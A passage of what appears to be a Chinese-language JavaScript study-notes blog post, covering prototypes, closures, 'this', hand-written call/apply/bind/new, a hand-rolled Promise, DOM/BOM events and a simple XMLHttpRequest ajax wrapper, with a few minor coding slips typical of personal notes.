<span class="hljs-keyword">return</span> res;&#125;</code></pre></div><h3 id="变量计算"><a href="#变量计算" class="headerlink" title="变量计算"></a>变量计算</h3><p>类型转换：</p><ul><li>字符串拼接 100+‘100’=100100</li><li>==运算符号 100 == ‘100’ true 一般只用检查null或undefine时用==</li><li>if和!!会会将变量转换为true或false</li><li>&amp;&amp;和|| 都可以用作计算 ‘0’||’abc’返回‘abc’， 100 || 0 返回100， 0 &amp;&amp;100 返回0</li></ul><h2 id="原型和原型链"><a href="#原型和原型链" class="headerlink" title="原型和原型链"></a>原型和原型链</h2><h3 id="class和继承"><a href="#class和继承" class="headerlink" title="class和继承"></a>class和继承</h3><p>ES6可以用class，extends，constructor，super完成类的创建和继承，ES5中的继承需要手动实现</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">inheritPrototype</span>(<span class="hljs-params">subType, superType</span>) </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">F</span>(<span class="hljs-params"></span>) </span>&#123;&#125;;    F.prototype = superType.prototype;    subType.prototype = <span class="hljs-keyword">new</span> F();    subType.prototype.constructor = subType;&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Father</span>(<span class="hljs-params">father</span>) </span>&#123;    <span class="hljs-keyword">this</span>.father = father;    Father.prototype.sayFather() = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-built_in">console</span>.log(<span class="hljs-keyword">this</span>.father);    &#125;&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Son</span>(<span class="hljs-params">son, father</span>) </span>&#123;    <span class="hljs-keyword">this</span>.son = son;    Father.call(<span class="hljs-keyword">this</span>, father);&#125;inheritPrototype(Son, Father);Son.prototype.saySon() = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;    <span class="hljs-built_in">console</span>.log(<span class="hljs-keyword">this</span>.son);&#125;</code></pre></div><h3 id="原型、原型链和instanceof"><a href="#原型、原型链和instanceof" class="headerlink" title="原型、原型链和instanceof"></a>原型、原型链和instanceof</h3><p>instanceof可以判断引用类型的数据是否是由某个类实例化的</p><p>hasOwnProperty检查是否是自身拥有的属性</p><p>终点是一个object的实例，<code>__proto__</code>为空</p><p>进阶内容：</p><p><em>1.object对象是由 object()方法实例化的，而 object()函数也是对象，是由 function object()声明，这个函数对象的 prototype指向上文中所说的终点（<code>__proto__</code>为空的 object实例），而其自身还拥有一个<code>__proto__</code>，指向构造它的函数的 prototype，也就是 function的 prototype。</em></p><p><em>2.function.prototype是一个 object实例对象，其<code>__proto__</code>指向上文的终点。而 function也是由 function声明的（没错自己是自己的构造函数），所以它是唯一自身的<code>__proto__</code>指向 prototype的函数，对于其他函数而言，由于都是 funciton构造的，所以所有函数的<code>__proto__</code>都指向 function()的 prototype</em></p><p>手写一个简单的jQuery：</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">jQuery</span></span>&#123;    <span class="hljs-keyword">constructor</span>(selector) &#123;        <span class="hljs-keyword">const</span> result = <span class="hljs-built_in">document</span>.querySelectorAll(selector);        <span class="hljs-keyword">const</span> length = result.length;        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; length; i++) <span class="hljs-keyword">this</span>[i] = result[i];        <span class="hljs-keyword">this</span>.length = length;        <span class="hljs-keyword">this</span>.selector = selector;    &#125;    <span class="hljs-keyword">get</span>(index) &#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>[index];    &#125;    each(fn) &#123;        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-keyword">this</span>.length; i++) &#123;            <span class="hljs-keyword">const</span> elem = <span class="hljs-keyword">this</span>[i];            fn(elem);        &#125;    &#125;    on(type, fn) &#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.each(<span class="hljs-function"><span class="hljs-params">elem</span> =&gt;</span> &#123;            elem.addEventListener(type, fn, <span class="hljs-literal">false</span>);        &#125;)    &#125;&#125;<span class="hljs-comment">// 拓展</span>jQuery.prototype.more() = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;...&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">myJQuery</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">JQuery</span> </span>&#123;    <span class="hljs-keyword">constructor</span>(selector) &#123;        <span class="hljs-keyword">super</span>(selector);        ...    &#125;&#125;</code></pre></div><h2 id="作用域和闭包"><a href="#作用域和闭包" class="headerlink" title="作用域和闭包"></a>作用域和闭包</h2><h3 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h3><p>ES6新增了块级作用域</p><p>闭包：作用域应用的特殊情况，一般有两种表现</p><ul><li>函数作为参数被传递</li><li>函数作为返回值被返回</li></ul><p>自由变量的查找是从函数定义的地方向上层作用域查找，而不是在执行的作用域查找</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-comment">// 函数作为返回值</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">create</span>(<span class="hljs-params"></span>) </span>&#123;    <span class="hljs-keyword">let</span> a = <span class="hljs-number">100</span>;    <span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-built_in">console</span>.log(a);    &#125;&#125;<span class="hljs-keyword">const</span> fn1 = create();<span class="hljs-keyword">const</span> a = <span class="hljs-number">200</span>;fn1(); <span class="hljs-comment">// 100</span><span class="hljs-comment">// 函数作为参数</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">printm</span>(<span class="hljs-params">fn</span>) </span>&#123;    <span class="hljs-keyword">const</span> b = <span class="hljs-number">200</span>;    fn();&#125;<span class="hljs-keyword">const</span> b = <span class="hljs-number">100</span>;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fn2</span>(<span class="hljs-params"></span>) </span>&#123;    <span class="hljs-built_in">console</span>.log(b);&#125;printm(fn2); <span class="hljs-comment">// 100</span></code></pre></div><p>闭包的作用：</p><p>可以隐藏数据，只提供API，防止手动修改数据</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">createCache</span>(<span class="hljs-params"></span>) </span>&#123;    <span class="hljs-keyword">const</span> data = &#123;&#125;; <span class="hljs-comment">// 将data隐藏，外界无法通过data.a更改数据</span>    <span class="hljs-keyword">return</span> &#123;        <span class="hljs-keyword">set</span>(key, value) &#123;            data[key] = value;        &#125;,        <span class="hljs-keyword">get</span>(key) &#123;            <span class="hljs-keyword">return</span> data[key];        &#125;    &#125;;&#125;<span class="hljs-keyword">let</span> x = createCache();x.set(<span class="hljs-string">'a'</span>,<span class="hljs-number">100</span>);<span class="hljs-built_in">console</span>.log(x.get(<span class="hljs-string">'a'</span>))</code></pre></div><p>建立不同的隐藏作用域</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;    a[i].onclick = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;        alert(i);    &#125;&#125; <span class="hljs-comment">// 每个a点击后都出现 10</span><span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;    (<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">num</span>) </span>&#123;        a[num].onclick = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;            alert(num);        &#125;    &#125;)(i);&#125; <span class="hljs-comment">// 每个a点击后都出现对应的数字</span><span class="hljs-comment">// 但是let与var不同在于let有块级作用域（每个循环一个块作用域），每个a都能输出对应的数字</span><span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;    a[i].onclick = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;        alert(i);    &#125;&#125;</code></pre></div><h3 id="this"><a href="#this" class="headerlink" title="this"></a>this</h3><p>this的取值是在函数执行时判断，而不是定义时，适用于所有普通情况=&gt;普通函数、call、apply、bind、对象方法、class</p><p>而对于箭头函数，this是在定义函数时绑定的，而不是执行过程中。（这样做解决了匿名函数、setTimeout的this指向问题），当然用上文闭包中变量在函数定义的地方查找的原理，可以先用一个that保存this，使用that就不会有这些问题了。。</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> a = &#123;    name: <span class="hljs-string">'a'</span>,    say() &#123;        <span class="hljs-built_in">console</span>.log(<span class="hljs-keyword">this</span>); <span class="hljs-comment">// a</span>    &#125;,    wait() &#123;        setTimeout(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;            <span class="hljs-built_in">console</span>.log(<span class="hljs-keyword">this</span>); <span class="hljs-comment">// window</span>        &#125;)    &#125;&#125;<span class="hljs-keyword">const</span> b = &#123;    name: <span class="hljs-string">'b'</span>,    say() &#123;        <span class="hljs-built_in">console</span>.log(<span class="hljs-keyword">this</span>); <span class="hljs-comment">// b</span>    &#125;,    wait() &#123;        setTimeout(<span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> &#123;            <span class="hljs-built_in">console</span>.log(<span class="hljs-keyword">this</span>); <span class="hljs-comment">// b</span>        &#125;)    &#125;&#125;</code></pre></div><p>改变this的方式：bind，call，apply。</p><p>某一对象.调用方法.call(准备使用方法的对象, 参数)</p><p>1.判断调用对象是否为函数，即使我们是定义在函数的原型上的，但是可能出现使用 call 等方式调用的情况。</p><p>2.判断传入上下文对象是否存在，如果不存在，则设置为 window 。</p><p>3.处理传入的参数，截取第一个参数后的所有参数。</p><p>4.将函数作为上下文对象的一个属性。</p><p>5.使用上下文对象来调用这个方法，并保存返回结果。</p><p>6.删除刚才新增的属性。</p><p>7.返回结果。</p><p>apply和bind情况类似，不同点在于，apply传入参数为一整个数组，不需要解构。而bind需要判断最终返回的函数是否会作为一个构造函数调用，如果作为构造函数使用，构造的对象this就是执行上下文，而不是传入的那个context。</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">call</span>(<span class="hljs-params">context</span>) </span>&#123;    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">typeof</span> <span class="hljs-keyword">this</span> !== <span class="hljs-string">"function"</span>) <span class="hljs-built_in">console</span>.error(<span class="hljs-string">"type error"</span>);    context = context || <span class="hljs-built_in">window</span>;    context.fn = <span class="hljs-keyword">this</span>;    <span class="hljs-keyword">let</span> args = [...arguments].slice(<span class="hljs-number">1</span>), res;    res = context.fn(...args);    <span class="hljs-keyword">delete</span> context.fn;    <span class="hljs-keyword">return</span> res;&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">apply</span>(<span class="hljs-params">context</span>) </span>&#123;    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">typeof</span> <span class="hljs-keyword">this</span> !== <span class="hljs-string">"function"</span>) <span class="hljs-built_in">console</span>.error(<span class="hljs-string">"type error"</span>);    context = context || <span class="hljs-built_in">window</span>;    context.fn = <span class="hljs-keyword">this</span>;    <span class="hljs-keyword">let</span> res = <span class="hljs-literal">null</span>;    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">arguments</span>[<span class="hljs-number">1</span>]) res = context.fn(...arguments[<span class="hljs-number">1</span>]);    <span class="hljs-keyword">else</span> context.fn();    <span class="hljs-keyword">delete</span> context.fn;    <span class="hljs-keyword">return</span> res;&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">bind</span>(<span class="hljs-params">context</span>) </span>&#123;    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">typeof</span> <span class="hljs-keyword">this</span> !== <span class="hljs-string">"function"</span>) <span class="hljs-built_in">console</span>.error(<span class="hljs-string">"type error"</span>);    <span class="hljs-keyword">let</span> args = [...arguments].slice(<span class="hljs-number">1</span>), fn = <span class="hljs-keyword">this</span>;    <span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Fn</span>(<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-keyword">return</span> fn.apply(            <span class="hljs-keyword">this</span> <span class="hljs-keyword">instanceof</span> Fn ? <span class="hljs-keyword">this</span> : context,            args.concat(...arguments)        );    &#125;&#125;</code></pre></div><p>实现关键字new（new中也有this的问题）</p><p>1.首先创建了一个新的空对象</p><p>2.设置原型，将对象的原型设置为函数的 prototype 对象。</p><p>3.让函数的 this 指向这个对象，执行构造函数的代码（为这个新对象添加属性）</p><p>4.如果构造器没有手动返回对象，则返回第一步创建的新对象，如果有，则舍弃掉第一步创建的新对象，返回手动return的对象。</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">objectFactory</span>(<span class="hljs-params"></span>) </span>&#123;    <span class="hljs-keyword">let</span> newObj = <span class="hljs-literal">null</span>, <span class="hljs-keyword">constructor</span> = [].shift.call(arguments);    if(typeof <span class="hljs-keyword">constructor</span> !== "function") console.error("type error");    newObj = Object.create(<span class="hljs-keyword">constructor</span>.prototype);    let res = <span class="hljs-keyword">constructor</span>.apply(newObj, [...arguments]);    return typeof res === "object" ? res : newObj;&#125;</code></pre></div><h2 id="异步"><a href="#异步" class="headerlink" title="异步"></a>异步</h2><p>应用场景：主要在网络请求、定时任务等。</p><p>ES5中的异步依赖回调</p><p>ES6新增了promise，它的出现是为了解决回调地狱，从嵌套模式转为管道形式。</p><p>ES7中新增async、await，原理是使用ES6中的generator函数实现。</p><h3 id="ES5-回调"><a href="#ES5-回调" class="headerlink" title="ES5 回调"></a>ES5 回调</h3><p>回调地狱</p><div class="hljs"><pre><code class="hljs javascript">$.<span class="hljs-keyword">get</span>(url1, data1 =&gt; &#123;<span class="hljs-comment">// work with data1...</span>    <span class="hljs-comment">// data2 需要在data1处理之后在请求</span>    $.<span class="hljs-keyword">get</span>(url2, data2 =&gt; &#123;        <span class="hljs-comment">// work with data2</span>        $.<span class="hljs-keyword">get</span>(...)    &#125;)&#125;)</code></pre></div><h3 id="ES6-promise"><a href="#ES6-promise" class="headerlink" title="ES6 promise"></a>ES6 promise</h3><div class="hljs"><pre><code class="hljs javascript">getdata(url1).then(<span class="hljs-function"><span class="hljs-params">data1</span> =&gt;</span> &#123;    <span class="hljs-comment">// work with data1</span>    <span class="hljs-keyword">return</span> getdata(url2);&#125;).then(<span class="hljs-function"><span class="hljs-params">data2</span> =&gt;</span> &#123;    <span class="hljs-comment">// work with data2</span>    <span class="hljs-keyword">return</span> getdata(...)&#125;).catch(<span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> <span class="hljs-built_in">Error</span>(err));</code></pre></div><p>手写一个promise可以更好的理解这玩意：</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-comment">// 三种状态</span><span class="hljs-keyword">const</span> PENDING = <span class="hljs-string">'pending'</span>;<span class="hljs-keyword">const</span> RESOLVE = <span class="hljs-string">'resolve'</span>;<span class="hljs-keyword">const</span> REJECT = <span class="hljs-string">'REJECT'</span>;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyPromise</span> </span>&#123;    <span class="hljs-keyword">constructor</span>(executer) &#123;  <span class="hljs-comment">// promise需要传入一个函数，并且这个函数立即执行</span>        <span class="hljs-keyword">this</span>.state = PENDING; <span class="hljs-comment">// 将初始状态设置为pending</span>        <span class="hljs-keyword">this</span>.value = <span class="hljs-literal">undefined</span>; <span class="hljs-comment">// 成功值</span>        <span class="hljs-keyword">this</span>.reason = <span class="hljs-literal">undefined</span>; <span class="hljs-comment">// 失败原因</span>        <span class="hljs-keyword">this</span>.onResolveCallbacks = []; <span class="hljs-comment">// 成功后回调then中的成功函数</span>        <span class="hljs-keyword">this</span>.onRejectCallbacks = []; <span class="hljs-comment">// 拒绝后回调then中的拒绝函数</span>        <span class="hljs-keyword">try</span>&#123;            executer(<span class="hljs-keyword">this</span>.resolve.bind(<span class="hljs-keyword">this</span>), <span class="hljs-keyword">this</span>.reject.bind(<span class="hljs-keyword">this</span>)); <span class="hljs-comment">//  注意resolve和reject虽然都是作为executer参数传入的但实际上实现是由promise内部完成的</span>        &#125; <span class="hljs-keyword">catch</span>(err) &#123;                                                 <span class="hljs-comment">// 但实际上实现是由promise内部完成的</span>            reject(err);        &#125;    &#125;    resolve(value) &#123;        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">this</span>.state === PENDING) <span class="hljs-keyword">this</span>.state = RESOLVE; <span class="hljs-comment">// 成功resolve后改变状态</span>        <span class="hljs-keyword">this</span>.value = value; <span class="hljs-comment">// 将传入的value储存</span>        <span class="hljs-keyword">this</span>.onResolveCallbacks.forEach(<span class="hljs-function"><span class="hljs-params">onResolve</span> =&gt;</span> onResolve(<span class="hljs-keyword">this</span>.value)); <span class="hljs-comment">// 对数组中存放的每一个函数，由于状态改变，要一一执行</span>    &#125;    reject(reason) &#123;        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">this</span>.state === PENDING) <span class="hljs-keyword">this</span>.state = REJECT; <span class="hljs-comment">// 与上相同，改变状态</span>        <span class="hljs-keyword">this</span>.reason = reason; <span class="hljs-comment">// 存储失败原因</span>        <span class="hljs-keyword">this</span>.onRejectCallbacks.forEach(<span class="hljs-function"><span class="hljs-params">onReject</span> =&gt;</span> onReject(<span class="hljs-keyword">this</span>.reason)); <span class="hljs-comment">// 和上方一样，订阅发布罢了</span>    &#125;;    then(onResolve, onReject) &#123; <span class="hljs-comment">// 每个promise都有then，传入两个函数作为参数，分别处理成功和失败的值</span>        <span class="hljs-comment">// onResolve是否是函数，不是函数的话就自己定义为直接传值的函数</span>        onResolve = <span class="hljs-keyword">typeof</span> onResolve === <span class="hljs-string">'function'</span> ? onResolve : <span class="hljs-function"><span class="hljs-params">value</span> =&gt;</span> value;        <span class="hljs-comment">// 如果onReject不是函数，就直接把错抛出来，以上两行是为了promise.then()这种传入为空的情况</span>        onReject = <span class="hljs-keyword">typeof</span> onReject === <span class="hljs-string">'function'</span> ? onReject: <span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> &#123; <span class="hljs-keyword">throw</span> err &#125;;        <span class="hljs-keyword">let</span> promise2 = <span class="hljs-keyword">new</span> MyPromise(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> &#123;            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">this</span>.state === RESOLVE) &#123;                <span class="hljs-comment">// 规范规定then中的onResolve, onReject都不能被同步调用，必须是异步调用，不然无法确定then中的代码与外部同步代码的执行顺序</span>                <span class="hljs-comment">// 同时，假设不是异步，同步的话promise还未创建完成，在resolvePromise中就无法判断x与promise2的关系</span>                setTimeout(<span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> &#123;                    <span class="hljs-keyword">try</span> &#123;                        <span class="hljs-keyword">let</span> x = onResolve(<span class="hljs-keyword">this</span>.value);                        resolvePromise(promise2, x, resolve, reject);                    &#125; <span class="hljs-keyword">catch</span> (e) &#123;                        reject(e);                    &#125;                &#125;, <span class="hljs-number">0</span>);            &#125;            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">this</span>.state === REJECT) &#123;                setTimeout(<span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> &#123;                    <span class="hljs-keyword">try</span> &#123;                        <span class="hljs-keyword">let</span> x = onReject(<span class="hljs-keyword">this</span>.reason);                        resolvePromise(promise2, x, resolve, reject);                    &#125; <span class="hljs-keyword">catch</span> (e) &#123;                        reject(e);                    &#125;                &#125;, <span class="hljs-number">0</span>);            &#125;            <span class="hljs-comment">// 如果resolve或reject被放在一个setTimeout中，用then的时候状态还未更改，则需要用一个数组保存需要执行的函数</span>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">this</span>.state === PENDING) &#123;                <span class="hljs-keyword">this</span>.onResolveCallbacks.push(<span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> &#123;                    setTimeout(<span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> &#123;                        <span class="hljs-keyword">try</span> &#123;                            <span class="hljs-keyword">let</span> x = onResolve(<span class="hljs-keyword">this</span>.value);                            resolvePromise(promise2, x, resolve, reject);                        &#125; <span class="hljs-keyword">catch</span> (e) &#123;                            reject(e);                        &#125;                    &#125;, <span class="hljs-number">0</span>);                &#125;);                <span class="hljs-keyword">this</span>.onRejectCallbacks.push(<span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> &#123;                    setTimeout(<span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> &#123;                        <span class="hljs-keyword">try</span> &#123;                            <span class="hljs-keyword">let</span> x = onReject(<span class="hljs-keyword">this</span>.reason);                            resolvePromise(promise2, x, resolve, reject);                        &#125; <span class="hljs-keyword">catch</span> (e) &#123;                            reject(e);                        &#125;                    &#125;, <span class="hljs-number">0</span>);                &#125;);            &#125;        &#125;);        <span class="hljs-keyword">return</span> promise2;    &#125;&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">resolvePromise</span>(<span class="hljs-params">promise2, x, resolve, reject</span>) </span>&#123;    <span class="hljs-keyword">if</span>(x === promise2) <span class="hljs-keyword">return</span> reject(<span class="hljs-keyword">new</span> <span class="hljs-built_in">TypeError</span>(<span class="hljs-string">'循环promise了'</span>));    <span class="hljs-keyword">let</span> called; <span class="hljs-comment">// 假如x被创建成了一个带有then方法的很奇怪的东西，能同时或多次调用resolve/reject，这显然是不被规范允许的</span>    <span class="hljs-keyword">if</span>(x &amp;&amp; (<span class="hljs-keyword">typeof</span> x === <span class="hljs-string">'object'</span> || <span class="hljs-keyword">typeof</span> x === <span class="hljs-string">'function'</span>)) &#123; <span class="hljs-comment">// x不是null并且，x是一个对象或者函数时候，去找x的then方法</span>        <span class="hljs-keyword">try</span> &#123;            <span class="hljs-keyword">let</span> then = x.then; <span class="hljs-comment">// 避免有人使坏，then只能调用一次。。</span>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">typeof</span> then === <span class="hljs-string">'function'</span>) &#123; <span class="hljs-comment">// 如果then是一个函数，就默认x是一个promise，如果没找到then，把x当作普通值处理</span>                then.call(x, y =&gt; &#123; <span class="hljs-comment">// y是x在resolve后的结果，可能还是一个promise</span>                    <span class="hljs-keyword">if</span>(called) <span class="hljs-keyword">return</span>;                    called = <span class="hljs-literal">true</span>;                    resolvePromise(promise2, y, resolve, reject); <span class="hljs-comment">// 如果x的resolve依然是promise对象，就递归解析，知道x成为一个普通值</span>                &#125;, err =&gt; &#123;                    <span class="hljs-keyword">if</span>(called) <span class="hljs-keyword">return</span>;                    called = <span class="hljs-literal">true</span>;                    reject(err);                &#125;)            &#125; <span class="hljs-keyword">else</span> &#123;                resolve(x);            &#125;        &#125; <span class="hljs-keyword">catch</span> (e) &#123;            <span class="hljs-keyword">if</span>(called) <span class="hljs-keyword">return</span>; <span class="hljs-comment">// 合理的解释是规范要求，then抛出了异常，但y=&gt;&#123;&#125;和err=&gt;&#123;&#125;已被调用，就要忽略这玩意</span>            called = <span class="hljs-literal">true</span>;                 reject(e);        &#125;    &#125; <span class="hljs-keyword">else</span> &#123;        resolve(x); <span class="hljs-comment">// 现在x只是一个普通值</span>    &#125;&#125;</code></pre></div><h2 id="JS-Web-API"><a href="#JS-Web-API" class="headerlink" title="JS Web API"></a>JS Web API</h2><h3 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h3><p>DOM的本质：是HTML文本解析出的一棵树</p><p>DOM的节点操作：</p><ul><li>获取节点getElementByID（TagName ClassName）、querySelector</li><li>获取节点的property，比如style、nodeName、nodeType 实际上是修改js变量的属性</li><li>获取节点的attribute，比如p.setAttribute(‘data-name’, ‘hh’) 实际上是修改标签的属性</li></ul><p>DOM的结构操作：</p><ul><li>新建节点 createElement、插入节点appendChild、删除节点removeChild</li></ul><p>DOM性能：要避免频繁的DOM操作</p><p>对DOM查询做缓存（比如for循环不要每次都查列表长度）</p><p>将频繁操作整合到一次操作中（不在for中一直插入，整合后在循环结束再插入）</p><h3 id="BOM"><a href="#BOM" class="headerlink" title="BOM"></a>BOM</h3><p>navigator、screen、location、history</p><p>navigator 是一个包含浏览器信息的对象</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-comment">// navigator</span><span class="hljs-keyword">const</span> ua = navigator.userAgent;<span class="hljs-built_in">console</span>.log(ua.indexOf(<span class="hljs-string">'Chrome'</span>));<span class="hljs-comment">// screen</span><span class="hljs-built_in">console</span>.log(screen.width);<span class="hljs-comment">// location</span><span class="hljs-built_in">console</span>.log(location.href); <span class="hljs-comment">// 网址</span><span class="hljs-built_in">console</span>.log(location.protocol); <span class="hljs-comment">// 协议</span><span class="hljs-built_in">console</span>.log(location.host); <span class="hljs-comment">// url的host 域名</span><span class="hljs-built_in">console</span>.log(location.search); <span class="hljs-comment">// ?a=100&amp;b=200</span><span class="hljs-built_in">console</span>.log(location.pathname); <span class="hljs-comment">// 域名后的路径</span><span class="hljs-comment">// history 前进后退</span>history.back();history.forward();</code></pre></div><h3 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h3><p>event.preventDefault() 阻止默认行为，比如超链接的跳转等 （当a标签的href属性存在并有一个正确的地址时，点击它，它会跳转到对应的地址去，这就是它的默认行为）</p><p>DOM0与DOM2级事件的区别：</p><ul><li>DOM0绑定多个事件后只执行最后一个，而DOM2可以绑定多个，只有当事件名，函数名，发生阶段都一样才会只执行最后一个</li><li>DOM0不需要考虑兼容问题</li><li>DOM0事件规定的事件流包含3个阶段，<strong>事件捕获阶段、处于目标阶段、事件冒泡阶段</strong>。首先发生的事件捕获为截获事件提供机会，然后是实际的目标接收事件，最后一个阶段是事件冒泡阶段，可以在这个阶段对事件做出响应。也就是说，<strong>DOM0级事件只能触发事件冒泡阶段而不能触发事件捕获阶段</strong></li><li>DOM2级事件使用<code>addEventListener</code>和<code>removeEventListener</code>创建和删除，第三个参数为true时代表在捕获期间触发</li></ul><p>阻止冒泡使用：</p><ul><li>event.stopPropagation()，可以在DOM0，DOM2使用</li><li>event.target==this 判断是否是当前元素触发的绑定事件</li></ul><p>事件代理：利用冒泡机制，给父元素绑定监听事件</p><ul><li>可以大量节省内存占用，减少事件注册</li><li>实现当新增子对象时无需再次对其绑定</li></ul><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-comment">// 通用的事件监听函数 包括普通绑定和代理绑定</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">bindEvent</span>(<span class="hljs-params">elem, type, selector, fn</span>) </span>&#123;    <span class="hljs-keyword">if</span>(fn == <span class="hljs-literal">null</span>) [fn, selector] = [selector, fn]; <span class="hljs-comment">// 普通绑定第三个参数为fn</span>    elem.addEventListener(type, event =&gt; &#123;        <span class="hljs-keyword">const</span> target = event.target;        <span class="hljs-keyword">if</span>(selector) &#123; <span class="hljs-comment">// 代理绑定</span>            <span class="hljs-keyword">if</span>(target.matches(selector)) fn.call(target, event);            <span class="hljs-keyword">else</span> fn.call(target, event);        &#125;    &#125;)&#125;<span class="hljs-keyword">const</span> ula = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">'thisUl'</span>);bindEvent(ula, <span class="hljs-string">'click'</span>, <span class="hljs-string">'li'</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>) </span>&#123;e.target.innerHTML&#125;);</code></pre></div><h3 id="Ajax"><a href="#Ajax" class="headerlink" title="Ajax"></a>Ajax</h3><p>XMLHttpRequest封装一个简单的ajax</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ajax</span>(<span class="hljs-params">url, sucessFn</span>) </span>&#123;    <span class="hljs-keyword">const</span> xhr = <span class="hljs-keyword">new</span> XMLHttpRequest();    xhr.open(<span class="hljs-string">'GET'</span>, url, <span class="hljs-literal">true</span>); <span class="hljs-comment">// true为 异步请求</span>    xhr.send(<span class="hljs-literal">null</span>);    xhr.onreadystatechange = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-keyword">if</span>(xhr.readyState === <span class="hljs-number">4</span>) &#123;            <span class="hljs-keyword">if</span>(xhr.status === <span class="hljs-number">200</span>) &#123;                sucessFn(xhr.responseText);            &#125;        &#125;    &#125;&#125;<span class="hljs-comment">// post 请求,替换send内容，必须是一个字符串</span><span class="hljs-keyword">const</span> data = &#123;    value: <span class="hljs-number">123</span>&#125;<span class="hljs-comment">// xhr.send(JSON.stringify(data))</span></code></pre></div><p>跨域：ajax请求时，浏览器要求当前网页和server必须同源（安全）</p><ul><li>同源：协议、域名、端口三者一致</li><li>加载图片、css、js可以无视同源策略<code>&lt;img src=imgurl /&gt;</code>、<code>&lt;link href=cssurl /&gt;</code>、<code>&lt;script src=jsurl&gt;&lt;/script&gt;</code>，也就是说CDN引入可以跨域  <strong>tips：<code>&lt;img&gt;</code>可以用来统计打点，访问静态页面时,通过img标签指定src 为访问统计的地址, 